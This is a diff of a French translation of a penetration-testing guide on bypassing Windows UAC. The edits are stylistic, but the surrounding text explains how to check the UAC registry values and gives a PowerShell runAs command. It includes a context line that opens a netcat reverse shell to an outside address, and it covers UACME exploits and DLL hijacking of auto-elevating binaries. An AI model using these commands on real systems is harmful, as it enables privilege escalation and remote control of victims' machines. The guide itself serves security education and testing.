@@ -33,7 +33,7 @@ Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protecti
 
 Certains programmes sont **auto-élévés automatiquement** si l'**utilisateur appartient** au **groupe administrateur**. Ces binaires ont à l'intérieur de leurs _**Manifests**_ l'option _**autoElevate**_ avec la valeur _**True**_. Le binaire doit également être **signé par Microsoft**.
 
-Ensuite, pour **contourner** l'**UAC** (élever du **niveau** d'intégrité **moyen** **au niveau élevé**), certains attaquants utilisent ce type de binaires pour **exécuter du code arbitraire** car il sera exécuté à partir d'un **processus d'intégrité de niveau élevé**.
+Ensuite, pour **contourner** l'**UAC** (élever du **niveau** d'intégrité **moyen** **au niveau élevé**) certains attaquants utilisent ce type de binaires pour **exécuter du code arbitraire** car il sera exécuté à partir d'un **processus d'intégrité de niveau élevé**.
 
 Vous pouvez **vérifier** le _**Manifest**_ d'un binaire en utilisant l'outil _**sigcheck.exe**_ de Sysinternals. Et vous pouvez **voir** le **niveau d'intégrité** des processus en utilisant _Process Explorer_ ou _Process Monitor_ (de Sysinternals).
 
@@ -46,7 +46,7 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 EnableLUA    REG_DWORD    0x1
 ```
-Si c'est **`1`**, alors UAC est **activé**, si c'est **`0`** ou s'il **n'existe pas**, alors UAC est **inactif**.
+Si c'est **`1`**, alors UAC est **activé**. Si c'est **`0`** ou qu'il **n'existe pas**, alors UAC est **inactif**.
 
 Ensuite, vérifiez **quel niveau** est configuré :
 ```
@@ -57,13 +57,13 @@ ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
 - Si **`0`**, alors, UAC ne demandera pas (comme **désactivé**)
 - Si **`1`**, l'administrateur est **demandé pour le nom d'utilisateur et le mot de passe** pour exécuter le binaire avec des droits élevés (sur le Bureau Sécurisé)
-- Si **`2`** (**Toujours me notifier**) UAC demandera toujours confirmation à l'administrateur lorsqu'il essaie d'exécuter quelque chose avec des privilèges élevés (sur le Bureau Sécurisé)
+- Si **`2`** (**Toujours me notifier**) UAC demandera toujours une confirmation à l'administrateur lorsqu'il essaie d'exécuter quelque chose avec des privilèges élevés (sur le Bureau Sécurisé)
 - Si **`3`**, comme `1` mais pas nécessaire sur le Bureau Sécurisé
 - Si **`4`**, comme `2` mais pas nécessaire sur le Bureau Sécurisé
-- si **`5`**(**par défaut**) il demandera à l'administrateur de confirmer pour exécuter des binaires non Windows avec des privilèges élevés
+- si **`5`**(**par défaut**) il demandera à l'administrateur de confirmer l'exécution de binaires non Windows avec des privilèges élevés
 
 Ensuite, vous devez examiner la valeur de **`LocalAccountTokenFilterPolicy`**\
-Si la valeur est **`0`**, alors, seul l'utilisateur **RID 500** (**Administrateur intégré**) est capable d'effectuer des **tâches d'administration sans UAC**, et si c'est `1`, **tous les comptes dans le groupe "Administrateurs"** peuvent le faire.
+Si la valeur est **`0`**, alors, seul l'utilisateur **RID 500** (**Administrateur intégré**) est capable d'effectuer des **tâches administratives sans UAC**, et si c'est `1`, **tous les comptes du groupe "Administrateurs"** peuvent le faire.
 
 Et, enfin, examinez la valeur de la clé **`FilterAdministratorToken`**\
 Si **`0`**(par défaut), le **compte Administrateur intégré peut** effectuer des tâches d'administration à distance et si **`1`**, le compte Administrateur intégré **ne peut pas** effectuer des tâches d'administration à distance, à moins que `LocalAccountTokenFilterPolicy` soit défini sur `1`.
@@ -93,7 +93,7 @@ Il est important de mentionner qu'il est **beaucoup plus difficile de contourner
 
 ### UAC désactivé
 
-Si l'UAC est déjà désactivé (`ConsentPromptBehaviorAdmin` est **`0`**), vous pouvez **exécuter un shell inversé avec des privilèges d'administrateur** (niveau d'intégrité élevé) en utilisant quelque chose comme :
+Si l'UAC est déjà désactivé (`ConsentPromptBehaviorAdmin` est **`0`**), vous pouvez **exécuter un shell inversé avec des privilèges administratifs** (niveau d'intégrité élevé) en utilisant quelque chose comme :
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
@@ -106,7 +106,7 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 
 ### **Très** Basique "contournement" UAC (accès complet au système de fichiers)
 
-Si vous avez un shell avec un utilisateur qui fait partie du groupe Administrateurs, vous pouvez **monter le C$** partagé via SMB (système de fichiers) local dans un nouveau disque et vous aurez **accès à tout dans le système de fichiers** (même le dossier personnel de l'Administrateur).
+Si vous avez un shell avec un utilisateur qui fait partie du groupe Administrateurs, vous pouvez **monter le C$** partagé via SMB (système de fichiers) local dans un nouveau disque et vous aurez **accès à tout à l'intérieur du système de fichiers** (même le dossier personnel de l'Administrateur).
 
 > [!WARNING]
 > **On dirait que ce truc ne fonctionne plus**
@@ -139,7 +139,7 @@ Documentation et outil dans [https://github.com/wh0amitz/KRBUACBypass](https://g
 
 ### Exploits de contournement UAC
 
-[**UACME** ](https://github.com/hfiref0x/UACME)qui est une **compilation** de plusieurs exploits de contournement UAC. Notez que vous devrez **compiler UACME en utilisant visual studio ou msbuild**. La compilation créera plusieurs exécutables (comme `Source\Akagi\outout\x64\Debug\Akagi.exe`), vous devrez savoir **lequel vous avez besoin.**\
+[**UACME** ](https://github.com/hfiref0x/UACME) qui est une **compilation** de plusieurs exploits de contournement UAC. Notez que vous devrez **compiler UACME en utilisant visual studio ou msbuild**. La compilation créera plusieurs exécutables (comme `Source\Akagi\outout\x64\Debug\Akagi.exe`), vous devrez savoir **lequel vous avez besoin.**\
 Vous devez **être prudent** car certains contournements **demanderont d'autres programmes** qui **alerteront** l'**utilisateur** que quelque chose se passe.
 
 UACME a la **version de construction à partir de laquelle chaque technique a commencé à fonctionner**. Vous pouvez rechercher une technique affectant vos versions :
@@ -154,7 +154,7 @@ Aussi, en utilisant [cette](https://en.wikipedia.org/wiki/Windows_10_version_his
 
 #### Plus de contournements UAC
 
-**Toutes** les techniques utilisées ici pour contourner l'AUC **nécessitent** un **shell interactif complet** avec la victime (un shell nc.exe classique ne suffit pas).
+**Toutes** les techniques utilisées ici pour contourner l'AUC **nécessitent** un **shell interactif complet** avec la victime (un shell nc.exe commun n'est pas suffisant).
 
 Vous pouvez obtenir cela en utilisant une session **meterpreter**. Migrez vers un **processus** qui a la valeur **Session** égale à **1** :
 
@@ -174,10 +174,10 @@ Si vous ne vous souciez pas d'être bruyant, vous pourriez toujours **exécuter 
 
 ### Votre propre contournement - Méthodologie de contournement UAC de base
 
-Si vous jetez un œil à **UACME**, vous remarquerez que **la plupart des contournements UAC abusent d'une vulnérabilité de détournement de DLL** (principalement en écrivant la DLL malveillante sur _C:\Windows\System32_). [Lisez ceci pour apprendre comment trouver une vulnérabilité de détournement de DLL](../windows-local-privilege-escalation/dll-hijacking/).
+Si vous jetez un œil à **UACME**, vous remarquerez que **la plupart des contournements UAC abusent d'une vulnérabilité de détournement de DLL** (principalement en écrivant la dll malveillante sur _C:\Windows\System32_). [Lisez ceci pour apprendre à trouver une vulnérabilité de détournement de DLL](../windows-local-privilege-escalation/dll-hijacking/).
 
 1. Trouvez un binaire qui **s'auto-élève** (vérifiez que lorsqu'il est exécuté, il s'exécute à un niveau d'intégrité élevé).
-2. Avec procmon, trouvez des événements "**NOM NON TROUVÉ**" qui peuvent être vulnérables au **détournement de DLL**.
+2. Avec procmon, trouvez des événements "**NAME NOT FOUND**" qui peuvent être vulnérables au **détournement de DLL**.
 3. Vous aurez probablement besoin de **écrire** la DLL à l'intérieur de certains **chemins protégés** (comme C:\Windows\System32) où vous n'avez pas de permissions d'écriture. Vous pouvez contourner cela en utilisant :
    1. **wusa.exe** : Windows 7, 8 et 8.1. Cela permet d'extraire le contenu d'un fichier CAB à l'intérieur de chemins protégés (car cet outil est exécuté à partir d'un niveau d'intégrité élevé).
    2. **IFileOperation** : Windows 10.
